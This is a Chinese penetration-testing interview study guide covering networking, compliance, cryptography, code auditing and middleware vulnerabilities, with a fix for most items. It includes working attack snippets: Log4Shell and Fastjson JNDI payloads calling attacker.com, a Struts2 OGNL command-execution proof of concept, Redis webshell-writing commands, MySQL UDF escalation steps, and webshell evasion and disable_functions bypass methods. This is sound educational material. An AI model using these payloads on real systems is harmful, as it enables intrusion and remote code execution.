**解析**：可靠性靠开销换。TCP 保证顺序与完整，UDP 适合低延迟。面试可补：TCP 有流量/拥塞控制，UDP 没有。
**考察知识点**：连接/可靠/字节流、适用场景、实时性。

### Day 40 ｜ 三次握手 / 四次挥手
- [ ] **题目**：简述 TCP 三次握手与四次挥手。
**答案**：
- **握手**：①SYN → ②SYN+ACK ← ③ACK →，建立连接（双方确认收发能力）。
- **挥手**：①FIN → ②ACK ←（被动方可能还有数据）③FIN ← ④ACK →，关闭连接（全双工，需双向关闭）。
**解析**：三次握手防止历史连接；四次挥手因 TCP 全双工，被动方收到 FIN 后可能先回 ACK 继续发数据，再发自己的 FIN。TIME_WAIT 等待 2MSL 防旧包。
**考察知识点**：SYN/SYN+ACK/ACK、全双工、TIME_WAIT、2MSL。

### Day 41 ｜ TCP 为何三次握手（不是两次）
- [ ] **题目**：TCP 为什么是三次握手而不是两次？
**答案**：
- 两次握手只能确认**客户端→服务端**可达，无法确认**服务端→客户端**链路正常（服务端不知客户端能否收包）。
- 三次握手让双方都确认彼此的收发能力，且同步初始序列号（ISN），避免历史失效连接请求造成资源浪费。
**解析**：核心是确保"双向可达 + 序列号同步"。若两次，服务端过早分配资源，易被伪造 SYN 耗尽（SYN Flood 正是利用半连接）。
**考察知识点**：双向确认、ISN 同步、SYN Flood、资源分配时机。

### Day 42 ｜ 一次完整 HTTP 请求过程
- [ ] **题目**：从输入 URL 到页面返回，经历了什么？
**答案**：
1. DNS 解析（域名→IP，含缓存/递归查询）；
2. TCP 三次握手建立连接（HTTPS 还要 TLS 握手）；
3. 客户端发 HTTP 请求（方法/路径/头/Cookie）；
4. 服务端处理并返回响应（状态码/头/体）；
5. 浏览器解析渲染（HTML/CSS/JS），可能再发子资源请求；
6. TCP 四次挥手（或复用长连接）。
**解析**：长连接（HTTP/1.1 Keep-Alive、HTTP/2 多路复用）省去反复握手。HTTPS 多一层 TLS 握手（见 D45）。
**考察知识点**：DNS→TCP→HTTP→渲染、长连接、HTTPS 差异。

### Day 43 ｜ GET 与 POST 区别
- [ ] **题目**：GET 和 POST 有什么区别？
**答案**：
- GET 参数在 URL（可见、有长度限制、可被缓存/记录历史），用于获取；POST 在请求体（相对不可见、量大），用于提交。
- 语义上 GET 幂等/安全（不应改服务器状态），POST 非幂等。
- 实际都可传参、长度限制是浏览器/服务器约定而非协议硬限。
**解析**：安全/幂等是 REST 语义层面的关键区别，不是"POST 更安全"（明文仍可被抓包，需 HTTPS）。URL 参数更易泄露，敏感数据用 POST+HTTPS。
**考察知识点**：幂等/安全、参数位置、长度、语义约定。

### Day 44 ｜ Cookie 与 Session 区别、HttpOnly
- [ ] **题目**：Cookie 和 Session 的区别？HttpOnly 作用？
**答案**：
- **Cookie**：存客户端，随请求自动带，容量小（~4KB），可设过期。
- **Session**：存服务端，用 SessionID（常在 Cookie）关联，安全、容量大。
- **HttpOnly**：标记 Cookie 不可被 JS 读取，`document.cookie` 拿不到，缓解 XSS 盗 Cookie。
- **Secure**：仅 HTTPS 传输；**SameSite**：防 CSRF 跨站携带。
**解析**：Session 依赖 Cookie 传递 ID。HttpOnly 不能阻止 XSS 发请求，但能阻止脚本读取令牌。配合 Secure/SameSite 才完整。
**考察知识点**：客户端 vs 服务端、SessionID、HttpOnly/Secure/SameSite。

### Day 45 ｜ HTTPS 与 HTTP 区别、SSL/TLS 握手
- [ ] **题目**：HTTPS 如何保证安全？TLS 握手过程？
**答案**：
- **区别**：HTTP 明文；HTTPS = HTTP over TLS，加密+身份认证+完整性。
- **握手（简化 RSA 版）**：①ClientHello（支持的套件/随机数）②ServerHello+**证书**（含公钥）③客户端校验证书（CA 链/域名/有效期）④用公钥加密 premaster 发给服务端 ⑤双方算出对称会话密钥 ⑥加密通信。
- 现代用 **ECDHE** 前向保密（临时密钥，泄露也不解密历史）。
**解析**：核心三件事：证书防冒充（CA 体系）、非对称协商对称密钥（性能）、对称加密业务数据。前向保密让单次私钥泄露不影响历史会话。
**考察知识点**：CA 体系、对称/非对称、ECDHE 前向保密、证书校验。

### Day 46 ｜ DNS 原理与解析过程
- [ ] **题目**：DNS 的作用与解析流程？
**答案**：
- **作用**：域名→IP 的分布式数据库（应用层，走 UDP 53，大包用 TCP）。
- **流程**：浏览器缓存 → 本地 hosts → 本地 DNS（递归）→ 根 → 顶级域（.com）→ 权威 DNS → 返回 IP。
- **记录**：A/AAAA、CNAME、MX、NS、TXT、PTR（反向）。
**解析**：递归查询由本地 DNS 代劳，迭代查询在各级服务器间。DNS 污染/劫持可用于钓鱼与流量劫持；DNS 也是资产测绘重要入口。
**考察知识点**：递归/迭代、记录类型、缓存、DNS 劫持。

### Day 47 ｜ ARP 原理与 ARP 欺骗
- [ ] **题目**：ARP 协议原理？ARP 欺骗是什么？
**答案**：
- **原理**：局域网内 IP→MAC 的地址解析，主机广播"谁有 IP x？"目标单播回 MAC；结果缓存于 ARP 表。
- **欺骗**：攻击者在局域网伪造 ARP 应答，把自己 MAC 冒充网关/目标，实现中间人（截获/篡改流量）。
**解析**：ARP 无认证，故易被欺骗。防护：静态 ARP 绑定、DAI（动态 ARP 检测）、交换机端口安全、HTTPS/802.1X。
**考察知识点**：IP↔MAC、广播/单播、中间人、DAI。

### Day 48 ｜ 正向/反向代理区别、NAT
- [ ] **题目**：正向代理与反向代理的区别？NAT 是什么？
**答案**：
- **正向代理**：代表**客户端**访问外部（客户端配置，隐藏客户端，如科学上网/内网出网）。
- **反向代理**：代表**服务端**接收请求（服务端部署，隐藏真实服务器，负载均衡/SSL 卸载/WAF，如 Nginx）。
- **NAT**：网络地址转换，把内网私有 IP 映射为公网 IP（SNAT 出网、DNAT 端口映射），缓解 IPv4 不足并隐藏内网。
**解析**：正向"帮客户出去"，反向"帮服务器收"。NAT 使内网不可直连，是内网渗透需穿透的原因（见 D27）。
**考察知识点**：代理方向、负载均衡、SNAT/DNAT、内网隐藏。

---

# 模块七　系统与中间件漏洞

### Day 49 ｜ Redis 未授权访问及利用
- [ ] **题目**：Redis 未授权访问有什么危害？如何利用与防御？
**答案**：
- **危害**：公网暴露且无密码，攻击者可读数据、写**webshell**（`config set dir /var/www` + `set xxx "<?php...>"` + `save`）、写 **SSH 公钥**免密登录、写 crontab 反弹 shell、主从复制 RCE（module/so）。
- **防御**：**设强密码**（`requirepass`）、仅监听内网/127.0.0.1、改默认端口、以低权限运行、禁用危险命令（`FLUSHALL`/`CONFIG` 改名）、云安全组收紧。
**解析**：Redis 是内网/公网最常见的"送 shell"服务。主从复制 RCE（CVE-2019 类）危害极大。低权限运行可阻断写文件路径。
**考察知识点**：未授权、写 shell/公钥/cron、主从 RCE、requirepass。

### Day 50 ｜ MySQL 安全（口令/写文件/提权）
- [ ] **题目**：MySQL 相关的安全点有哪些？
**答案**：
- 口令弱/空密码、默认端口暴露；口令存于 `mysql.user`，`authentication_string` 为加密值。
- **写文件**：`into outfile` 受 `secure_file_priv` 与 File 权限限制（Day 2）。
- **提权**：UDF 提权（写 .so/.dll 并 `create function`）、MOF 提权（Win）、`mysql_log` 写文件。
- **防御**：强口令、最小权限、限制远程、关闭文件导出、升级版本。
**解析**：UDF 提权需能写插件目录且具 File 权限，老版本常见。现代 MySQL 默认 secure_file_priv 限制使写文件提权变难。
**考察知识点**：secure_file_priv、UDF/MOF 提权、口令存储、最小权限。

### Day 51 ｜ Tomcat / Weblogic 等中间件漏洞
- [ ] **题目**：常见中间件/框架漏洞有哪些？
**答案**：
- **Tomcat**：PUT 上传（CVE-2017-12615，默认关）、弱口令 + 后台部署 war 包 getshell、AJP 文件读取（CVE-2020-1938）。
- **Weblogic**：反序列化多条（XMLDecoder、T3/IIOP 反序列化 RCE）、后台部署。
- **Struts2**：OGNL 表达式注入（S2-系列 RCE）。
- **Log4j**：JNDI 注入（CVE-2021-44228，Log4Shell），`${jndi:ldap://}` 远程加载。
- **FastJson/Shiro**：反序列化（见 Day 11）。
**解析**：中间件/框架历史洞是外网突破口首选。Log4Shell 因广泛依赖影响巨大，核心是 JNDI 远程加载可控。
**考察知识点**：war 部署、反序列化链、Log4Shell、AJP。

### Day 52 ｜ Linux / Windows 安全加固要点
- [ ] **题目**：系统安全加固一般做什么？
**答案**：
- **Linux**：停用不必要的服务/端口、SSH 禁 root 登录+密钥登录+改端口、防火墙（iptables/nftables）、文件权限最小化、定期补丁、审计（auditd）、日志集中。
- **Windows**：关不必要的服务/共享、组策略加固、账户口令策略、UAC、补丁、EDR、限制管理员。
**解析**：加固=最小化攻击面 + 纵深防御 + 可观测。靶机/生产都要"默认拒绝、按需开放"。
**考察知识点**：最小权限、SSH 加固、补丁、组策略、EDR。

### Day 53 ｜ 常见端口与服务对应
- [ ] **题目**：列举常见端口及对应服务。
**答案**：
- 21 FTP、22 SSH、23 Telnet、25 SMTP、53 DNS、80 HTTP、443 HTTPS、110 POP3、135/139/445 SMB、1433 MSSQL、1521 Oracle、3306 MySQL、3389 RDP、5432 PostgreSQL、6379 Redis、8080 Tomcat、9000/9200 等。
**解析**：端口是资产测绘与服务识别的基础。445（SMB）是 EternalBlue 入口，3389（RDP）易被爆破，6379/3306 未授权/弱口令是常见突破口。
**考察知识点**：端口-服务映射、SMB/RDP/Redis、资产识别。

---

# 模块八　安全基础·等保·法律法规·加密

### Day 54 ｜ 等保 2.0 级别与要求
- [ ] **题目**：信息安全等级保护（等保 2.0）分几级？基本要求？
**答案**：
- **五级**：第一级（自主保护）、第二级（指导保护）、第三级（监督保护）、第四级（强制保护）、第五级（专控保护）。
- **2.0 扩展**：覆盖云计算/移动互联/物联网/工业控制/大数据；基本要求含**安全技术**（物理/网络/主机/应用/数据）与管理（制度/机构/人员/建设/运维）两大体系。
**解析**：一般重要系统定级二级或三级，三级需每年测评。2.0 从"单系统"走向"多云多场景"，强调"一个中心、三重防护"。
**考察知识点**：五级定义、2.0 扩展、技术+管理、三级测评。

### Day 55 ｜ 网络安全法 / 数据安全法要点
- [ ] **题目**：《网络安全法》与《数据安全法》的核心要求？
**答案**：
- **网安法**：网络运营者落实等级保护、实名、日志留存≥6 个月、个人信息保护、关键信息基础设施重点保护；明确攻击/入侵/干扰网络的违法责任。
- **数据安全法**：数据分类分级、重要数据保护、数据出境安全管理、数据处理活动的安全义务。
- 还有《个人信息保护法》《密码法》构成合规体系。
**解析**：合规是安全底线。渗透测试须有授权，触碰上述红线即违法。面试答"遵守授权与法规、不越界"。
**考察知识点**：等保义务、日志留存、数据分级、授权合法。

### Day 56 ｜ 对称/非对称加密、哈希、数字签名
- [ ] **题目**：对称加密、非对称加密、哈希、数字签名分别是什么？
**答案**：
- **对称加密**：同密钥加解密（AES/DES/3DES），快，但密钥分发难。
- **非对称**：公私钥对（RSA/ECC），公钥加密私钥解、私钥签名公钥验；慢，用于密钥协商/签名。
- **哈希**：单向摘要（MD5/SHA），不可逆、定长，用于完整性校验（如密码加盐存储）。
- **数字签名**：私钥对摘要加密，公钥验证，保证**不可否认+完整性+来源**。
**解析**：混合加密（AES 传数据 + RSA 传密钥）兼顾效率与安全。MD5/SHA1 已不推荐用于安全场景（碰撞），密码用 bcrypt/argon2 加盐。
**考察知识点**：对称 vs 非对称、哈希不可逆、签名、混合加密。

### Day 57 ｜ IDS / IPS / WAF / 防火墙区别
- [ ] **题目**：IDS、IPS、WAF、防火墙各自职责？
**答案**：
- **防火墙**：基于规则控制网络访问（包过滤/状态检测/应用网关），工作在网络层/应用层，主要"防越界"。
- **IDS**：入侵**检测**（旁路监听、告警，不阻断）。
- **IPS**：入侵**防御**（串行部署、可阻断）。
- **WAF**：Web 应用防火墙，针对 HTTP/HTTPS 应用层攻击（SQLi/XSS/上传等）过滤。
**解析**：防火墙管"网络通断"，WAF 管"Web 请求内容"，IDS/IPS 管"入侵行为"。WAF 在应用层、IDS/IPS 在网络层更广泛。
**考察知识点**：检测 vs 阻断、网络层 vs 应用层、WAF 定位。

### Day 58 ｜ 蜜罐技术
- [ ] **题目**：什么是蜜罐？有什么作用？
**答案**：
- **定义**：布置诱饵主机/服务/漏洞，主动吸引攻击者，用于**检测、预警、溯源、研究**攻击手法。
- **类型**：低交互（模拟服务，安全）/高交互（真实系统，信息多但风险高）；网络蜜罐/主机蜜罐/蜜网。
- **作用**：提前发现探测、拖延攻击、采集样本、辅助溯源反制（见 D38）。
**解析**：蜜罐是主动防御。高交互蜜罐需隔离，避免被用作跳板。护网中蜜罐/蜜饵常用于反制与溯源。
**考察知识点**：诱捕、低/高交互、检测与溯源、隔离风险。

---


# 模块九　代码审计与开发安全

### Day 59 ｜ ★★★★★ OWASP Top 10 2017 与 2021 对比
**题目**：OWASP Top 10 2017 与 2021 的主要差异？新增/合并了哪些类别？
**答案**：
- **2017 版**：A1 注入、A2 失效身份认证、A3 敏感数据泄露、A4 XXE、A5 失效访问控制、A6 安全配置错误、A7 XSS、A8 不安全反序列化、A9 已知漏洞组件、A10 日志不足。
- **2021 版**：A01 访问控制失效（合并）、A02 加密机制失效（合并）、A03 注入（合并 SQL/NoSQL/XXE/命令）、A04 **不安全设计（新增）**、A05 安全配置错误（前移）、A06 缺陷/过时组件、A07 身份认证失效、A08 **软件和数据完整性失效（新增，含反序列化/CI/CD 供应链）**、A09 日志监控失效（改名）、A10 **服务端请求伪造 SSRF（新增独立）**。
- **关键新增**：A04 不安全设计（强调威胁建模与架构安全）、A08 完整性失效（SolarWinds/Codecov 供应链）、A10 SSRF 独立（云时代内网访问风险）。
- **关键合并**：敏感数据泄露并入加密失效类；XSS 并入注入类作为子项。
**解析**：考察 Web 安全全景认识与行业趋势。易错点：把 2017 的 A1 注入直接对应 2021 的 A03（实际范围已扩大）。面试官想听到：能讲清 SSRF 为何独立成类（云元数据访问风险加剧）、理解"不安全设计"是新增的理念类（覆盖整个 SDLC 而非具体漏洞）、知道 A08 与供应链攻击的关联。
**考察知识点**：2017 → 2021 合并/新增/重命名、A04 不安全设计、A08 完整性失效、A10 SSRF 独立、注入类范围扩大。**→ 详见《面试精华宝典》精讲第 9 题**。

### Day 60 ｜ ★★★★ 代码审计主要方法与常见漏洞
**题目**：代码审计的主要方法论是什么？常见漏洞类型有哪些？
**答案**：
- **方法论**：
  1. **自上而下（Top-Down）**：从入口点（Controller/Servlet/路由）追踪到危险函数（SQL 执行、文件操作、命令执行）。
  2. **自下而上（Bottom-Up）**：从危险函数（`eval`、`system`、`Statement.execute`）反向追踪调用链。
  3. **横向审计**：按功能模块（认证/支付/文件上传）逐个审计。
  4. **数据流审计（污点追踪）**：跟踪用户输入从入口到危险函数的完整路径。
- **常见漏洞**：
  - **注入**：SQL / NoSQL / 命令 / 表达式（SpEL/OGNL/EL/JEXL）。
  - **反序列化**：Java `ObjectInputStream` / PHP `unserialize` / Python `pickle` / Node `node-serialize`。
  - **文件操作**：任意文件读写、路径遍历、文件上传漏洞。
  - **身份认证**：硬编码凭证、会话固定、弱加密算法、密码明文存储。
  - **权限**：越权访问、IDOR、缺失权限校验。
  - **Web 标准**：XXE / XSS / CSRF / SSRF。
  - **加密**：硬编码密钥、弱算法（MD5/SHA1）、不安全随机数。
  - **日志**：敏感信息泄露、缺失审计。
- **工具链**：Fortify / Checkmarx（商业）、Semgrep / CodeQL / SonarQube（开源）。
**解析**：考察代码审计能力（实习→高级进阶）。易错点：只说工具不说方法论。面试官想听到：能区分自上而下 vs 自下而上、知道污点追踪是核心思路、明白不同语言的危险函数差异。
**考察知识点**：Top-Down vs Bottom-Up、污点追踪（Taint Analysis）、跨语言危险函数、工具链分层。**→ 详见《面试精华宝典》精讲第 33 题**。

### Day 61 ｜ ★★★ 代码审计的流程、方法与工具链
**题目**：代码审计的项目流程是什么？有哪些实用工具？
**答案**：
- **流程**：
  1. **前期准备**：获取代码仓库、确认审计范围、搭建运行环境（含调试器）。
  2. **熟悉架构**：了解技术栈（Spring/Django/Laravel/Express）、识别入口点（路由、Controller、中间件）。
  3. **工具扫描**：先用自动化工具（Semgrep/CodeQL）跑一遍，输出候选漏洞清单。
  4. **人工复核**：对工具结果去重、验证可达性、利用条件、危害。
  5. **深度挖掘**：对核心业务做横向+纵向审计（污点追踪+危险函数）。
  6. **漏洞报告**：按"漏洞描述 + 复现步骤 + 危害评估 + 修复建议"四段式输出。
  7. **复测**：修复后回归测试，确认漏洞已闭合。
- **方法**：
  - **关键字搜索**：`eval` / `exec` / `system` / `Statement` / `request.getParameter` / `pickle.loads`。
  - **正则模式**：弱哈希（`md5(`、`sha1(`）、硬编码密钥（`api_key =`、`password =`）。
  - **数据流追踪**：污点分析（用户输入 → 危险函数）。
  - **调用图**：通过 IDE 插件（如 IntelliJ Code Vision）看调用链。
- **工具**：
  - **商业**：Fortify SCA、Checkmarx、Veracode（贵但全面）。
  - **开源/免费**：Semgrep（轻量规则）、CodeQL（GitHub）、SonarQube（持续集成）。
  - **IDE 插件**：JetBrains Security（实时检查）、Cobra（白盒扫描）。
  - **专项**：PHP CodeSniffer、Bandit（Python）、Brakeman（Ruby on Rails）、gosec（Go）。
**解析**：考察项目落地能力。易错点：直接用工具扫描就完事（缺少人工复核）。面试官想听到：能讲清工具结果去重与可达性验证、明白不同语言工具差异（Bandit/Brakeman/Semgrep）。
**考察知识点**：审计 7 步流程、关键字+正则+数据流+调用图四类方法、工具分层（商业/开源/IDE/专项）、漏洞报告四段式。**→ 详见《面试精华宝典》精讲第 44 题**。

### Day 62 ｜ ★★★★ PHP 危险函数与 disable_functions 绕过
**题目**：PHP 中哪些函数最危险？disable_functions 如何绕过？
**答案**：
- **PHP 命令执行**：system、exec、shell_exec（反引号）、passthru、popen、proc_open、pcntl_exec。
- **PHP 代码执行**：eval、assert、preg_replace（/e 已废弃）、create_function（已废弃）、call_user_func、array_map（回调可控）。
- **disable_functions 绕过**：
  1. **LD_PRELOAD 劫持**：`putenv()` + `mail()` 触发新进程加载恶意 .so（最常用，PHP 5.x-8.x 通杀）。
  2. **FFI 扩展**（PHP 7.4+）：`ffi.cdef` 调用 C 函数执行系统命令。
  3. **ImageMagick 命令执行**（CVE-2016-3714）：图片处理时执行命令。
  4. **Bash 破壳漏洞**（CVE-2014-6271）：环境变量注入。
  5. **PHP 7.0-7.3 gc 回收**：`json_encode` 触发 UAF。
  6. **chankro**：Python 工具自动生成 .so + putenv + mail。
  7. **Apache mod_cgi**：`.htaccess` + 图片马 + CGI。
- **WebShell 免杀**：base64+str_rot13+gzinflate 多层编码、可变函数拼接、回调函数、OPcache 缓存、Java 内存马。
- **防御组合**：`disable_functions` + `open_basedir` + `putenv`/`mail` 禁用 + WAF + RASP。
**解析**：考察 PHP 安全细节。易错点：以为 `disable_functions` 禁用就安全。面试官想听到：能列 LD_PRELOAD / FFI / chankro 等现代绕过方案、明白免杀方向（编码/回调/内存马）。
**考察知识点**：PHP 命令/代码执行函数分类、disable_functions 主流绕过（LD_PRELOAD/FFI/chankro）、WebShell 免杀方向、纵深防御组合。**→ 详见《面试精华宝典》精讲第 28 题**。

---

# ============================================================

# 模块十　中间件与组件漏洞

### Day 63 ｜ ★★★★★ Tomcat / JBoss / WebLogic 中间件漏洞
**题目**：常见 Java 中间件高危漏洞有哪些？
**答案**：
- **Tomcat**：
  - PUT 上传（CVE-2017-12615）：`readonly=false` 时支持 PUT，部署 war。
  - AJP 文件读取（CVE-2020-1938，GhostCat）：8009 端口 AJP 协议读任意文件。
  - 弱口令 + 后台部署 war：`/manager/html` 默认 admin/admin。
  - 反序列化（Apache Commons Collections gadget）。
- **WebLogic**：
  - XMLDecoder 反序列化（CVE-2017-10271）：`/wls-wsat/CoordinatorPortType`。
  - T3/IIOP 反序列化：7001 端口多个 gadget（CC/CB）。
  - 后台弱口令 + 部署 war。
- **JBoss**：
  - JMXInvokerServlet / HttpInvoker 反序列化（CVE-2015-7501）。
  - `/admin-console` 默认 admin/admin。
  - war 部署（默认可写）。
- **GlassFish**：admin 后台默认 admin/admin（无口令）。
- **Apache**：解析漏洞（多后缀）、mod_cgi 绕过、Range 头 DoS。
- **Nginx**：解析漏洞（CVE-2013-4547 空字节）、目录穿越、alias 错误配置。
**解析**：考察外网突破首选面。易错点：只说 Tomcat 弱口令。面试官想听到：能列具体 CVE 编号、知道 WebLogic 反序列化链最丰富、理解 AJP/T3 等特殊端口协议。
**考察知识点**：Tomcat CVE-2017-12615/2020-1938、WebLogic XMLDecoder + T3、JBoss HttpInvoker、GlassFish 默认无口令、war 部署+弱口令组合。**→ 详见《面试精华宝典》精讲第 11 题**。

### Day 64 ｜ ★★★★★ Log4j2 JNDI 注入漏洞（CVE-2021-44228，Log4Shell）
**题目**：Log4Shell 漏洞原理、影响与修复？
**答案**：
- **原理**：Log4j2 的 `lookup()` 函数支持 JNDI 远程加载，当日志内容含 `${jndi:ldap://attacker.com/exp}` 时触发 JNDI 查询，下载并执行恶意 Java 类 → RCE。
- **影响范围**：Log4j 2.x ≤ 2.14.1，全球数百万应用（Apache Struts2、Solr、ElasticSearch、Minecraft 等）。
- **漏洞特征**：payload 形如 `${jndi:ldap://x.x.x.x:1389/a}`、`${jndi:dns://x.x.x.x}`。
- **绕过**：2.15.0 修补不彻底（CVE-2021-45046 绕过），2.16.0 默认禁用递归查找但仍可触发，2.17.0 仍存在 CVE-2021-45105 DoS。
- **修复**：
  1. 升级到 **Log4j 2.17.1+**（彻底禁用 JNDI Lookup）。
  2. 临时缓解：JVM 参数 `-Dlog4j2.formatMsgNoLookups=true`。
  3. 移除 classpath 中 `JndiLookup.class`。
  4. WAF 拦截 `${jndi:` 关键字。
- **检测**：`grep -r "log4j-core"` 找依赖、运行时检测 JNDI 调用。
**解析**：考察近年重大漏洞与应急响应能力。易错点：以为 2.15.0 修复即可（实际有 45046 绕过）。面试官想听到：能讲清 JNDI Lookup 调用链、知道 2.16/2.17 才彻底修复、明白绕过原理（递归查找）。
**考察知识点**：JNDI 注入原理（ldap/rmi/dns 外带）、Log4j 2.x 版本漏洞时间线、CVE-2021-44228/45046/45105 三个 CVE 关联、应急缓解（formatMsgNoLookups + 移除 JndiLookup.class）。**→ 详见《面试精华宝典》精讲第 22 题**。

### Day 65 ｜ ★★★★★ Shiro 反序列化漏洞（Shiro-550/721）
**题目**：Shiro-550 与 Shiro-721 的区别？
**答案**：
- **Shiro-550（CVE-2016-4437）**：
  - 原理：Shiro `rememberMe` cookie 使用 AES-CBC 加密，**硬编码密钥** `kPH+bIxk5D2deZiIxcaaaA==`。
  - 已知密钥 → 构造恶意序列化数据 → AES-CBC 加密 → 设置 rememberMe cookie → 反序列化触发 gadget（CommonsCollections 等）。
  - 影响：Shiro < 1.2.5。
- **Shiro-721（CVE-2019-12422）**：
  - 原理：Shiro 1.2.5 后改用随机密钥，但 padding oracle 攻击可逐字节猜解。
  - 发送大量 rememberMe cookie + 比对错误信息 → 反推明文 → 构造恶意序列化 payload。
  - 影响：Shiro < 1.4.2。
- **利用工具**：ysoserial 生成 payload、ShiroExploit GUI、shiro_attack。
- **修复**：
  - Shiro-550：升级 + 自定义密钥（`shiro.rememberMe.key`）。
  - Shiro-721：升级到 1.4.2+。
  - 关闭 rememberMe 功能（若不需要）。
**解析**：考察 Java 反序列化经典案例。易错点：混淆 Shiro-550 和 721 的利用条件（前者靠硬编码密钥，后者靠 padding oracle）。面试官想听到：能讲清 AES-CBC 加密细节、padding oracle 原理、ysoserial 生成 payload。
**考察知识点**：Shiro-550 硬编码 AES 密钥、Shiro-721 padding oracle 攻击、rememberMe cookie 加密流程、ysoserial gadget 链。**→ 详见《面试精华宝典》精讲第 23 题**。

### Day 66 ｜ ★★★★★ Fastjson 反序列化漏洞原理与 POC
**题目**：Fastjson 反序列化漏洞原理？常见 POC？
**答案**：
- **原理**：Fastjson 的 `@type` 字段支持自动类型还原，攻击者构造 `{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/exp","autoCommit":true}` → 反序列化触发 JNDI 查找 → 远程加载恶意类 → RCE。
- **版本演进**：
  - **1.2.24 及之前**：无任何限制，可直接 @type 触发。
  - **1.2.25-1.2.41**：增加黑名单（`com.sun.rowset.JdbcRowSetImpl` 等）。
  - **1.2.42-1.2.47**：黑名单 + 关键字检测。
  - **1.2.48-1.2.68**：开启 `safeMode` 才安全；否则仍可通过 `java.lang.Class` 等绕过。
  - **1.2.83+**：默认禁用 autoType，相对安全。
- **常见 POC**：
  - JdbcRowSetImpl + JNDI（最早）。
  - TemplatesImpl + `@type` 触发内部类加载。
  - 各种 gadget（CB/CC/Spring/SLF4J 等）。
- **利用工具**：FastjsonAttack、fastjson-scan-burp、ysoserial。
- **修复**：升级 1.2.83+；启用 `safeMode`；不反序列化不可信数据。
**解析**：考察 Java 反序列化核心考点。易错点：以为升级就绝对安全（仍有绕过）。面试官想听到：能讲清 autoType 黑名单绕过历史、知道 TemplatesImpl 是最后通杀、明白 fastjson 1.x 与 2.x 差异。
**考察知识点**：@type 自动类型还原原理、JdbcRowSetImpl JNDI 触发链、版本绕过时间线（1.2.24 → 1.2.83）、TemplatesImpl 内部类加载、safeMode 与 ParserConfig 黑名单。**→ 详见《面试精华宝典》精讲第 24 题**。

### Day 67 ｜ ★★★ Struts2 历史 RCE 漏洞与 OGNL 表达式注入
**题目**：Struts2 历史经典 RCE 有哪些？OGNL 是什么？
**答案**：
- **OGNL（Object-Graph Navigation Language）**：Struts2 标签属性使用的表达式语言，可访问对象方法（如 `Runtime.getRuntime().exec("cmd")`）。
- **经典漏洞**：
  - **S2-045（CVE-2017-5638）**：Content-Type 头 OGNL 注入（multipart/form-data 解析时）。
  - **S2-046**：与 S2-045 类似，触发点在 Content-Disposition 的 filename。
  - **S2-048**：Struts2 插件的 OGNL 注入（freemarker、codebehind）。
  - **S2-052（CVE-2017-9805）**：REST 插件 XStream 反序列化。
  - **S2-053**：Freemarker 标签 OGNL 注入。
  - **S2-057（CVE-2018-11776）**：redirectAction OGNL 注入。
  - **S2-061（CVE-2020-17530）**：OGNL 沙箱绕过。
- **POC 示例**：`%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(#a)}`
- **修复**：升级到 Struts 2.5.26+ / 6.x；禁用 OGNL（特定场景）；WAF 拦截 `ognl` 关键字。
**解析**：考察经典框架漏洞理解。易错点：只说 S2-045。面试官想听到：能列 5+ S2 系列 CVE、明白 OGNL 沙箱绕过思路、知道 Content-Type/filename 等不同注入点。
**考察知识点**：OGNL 表达式语法、S2-045/046/048/052/053/057/061 时间线、Content-Type/filename/redirectAction 注入点、OGNL 沙箱绕过。**→ 详见《面试精华宝典》精讲第 47 题**。

### Day 68 ｜ ★★★ Spring4Shell（CVE-2022-22965）漏洞原理与利用
**题目**：Spring4Shell 漏洞原理？与 Log4Shell 区别？
**答案**：
- **原理**：Spring 框架（Spring MVC）的 DataBinder 在处理请求参数时未严格限制属性绑定路径，攻击者构造 `class.module.classLoader.DefaultAssertionStatus` 等嵌套属性 → 通过 `Module` 的 `ClassLoader` 修改 `URLStreamHandler` 中的 `path` 字段 → 修改 Tomcat 日志路径并写入 webshell。
- **触发条件**：
  - **JDK ≥ 9**（`Module` API 引入）。
  - 使用 Spring MVC + Tomcat。
  - 应用以可写权限运行。
- **影响版本**：Spring 5.x（部分）、JDK 9-17、Tomcat。
- **修复**：
  - Spring 5.3.18+ / 5.2.20+。
  - 升级 Tomcat（高版本已修复）。
  - **禁用 WebDataBinder 的特殊字段绑定**（核心修复）。
- **与 Log4Shell 区别**：
  - **Log4Shell**：JNDI 远程加载类，原理简单，影响面广。
  - **Spring4Shell**：JDK Module API + Tomcat 类加载器 + 数据绑定，原理复杂，利用条件苛刻，影响面相对小。
**解析**：考察近年重大 RCE 漏洞。易错点：与 Log4Shell 混淆。面试官想听到：能讲清 DataBinder 属性绑定漏洞原理、明白需要 JDK 9+ Module API、知道实际利用条件苛刻（不像 Log4Shell 普遍）。
**考察知识点**：Spring DataBinder 属性绑定漏洞、JDK 9+ Module API 利用、Tomcat Pipeline + classLoader 写入 webshell、影响版本组合（Spring+JDK 9-17+Tomcat）、与 Log4Shell 对比。**→ 详见《面试精华宝典》精讲第 46 题**。

---

# ============================================================

# 模块十一　操作系统 / 数据库 / 日志深入

### Day 69 ｜ ★★★★ MySQL UDF / MOF 提权原理
**题目**：MySQL UDF 提权和 MOF 提权的原理？
**答案**：
- **UDF（User Defined Function）提权**：
  - 原理：MySQL 允许加载用户自定义函数（.so/.dll），`create function sys_exec returns integer soname 'udf.dll'` 注册后即可调用执行系统命令。
  - **步骤**：
    1. 上传 .so/.dll 到 MySQL 插件目录（`@@plugin_dir`）。
    2. `CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.dll';`
    3. `SELECT sys_exec('whoami');`
  - **条件**：MySQL 用户有 FILE 权限 + 知道插件目录 + 目录可写。
- **MOF（Managed Object Format）提权（仅 Windows）**：
  - 原理：Windows WMI 服务每 5 秒扫描 `c:/windows/system32/wbem/mof/` 目录的 .mof 文件并执行其语句。
  - **步骤**：
    1. 上传恶意 .mof 文件（含 `On Error Resume Next; New ActiveXObject("Wscript.Shell").Run "cmd.exe /c ..."`）。
    2. 5 秒后自动执行。
  - **条件**：Windows + MySQL < 5.7 + FILE 权限 + 目录可写。
- **现代 MySQL 缓解**：5.7+ 插件目录默认安全，root 密码策略加强，secure_file_priv 限制。
- **修复**：升级 MySQL + 限制 FILE 权限 + 改 root 密码 + 限制网络访问。
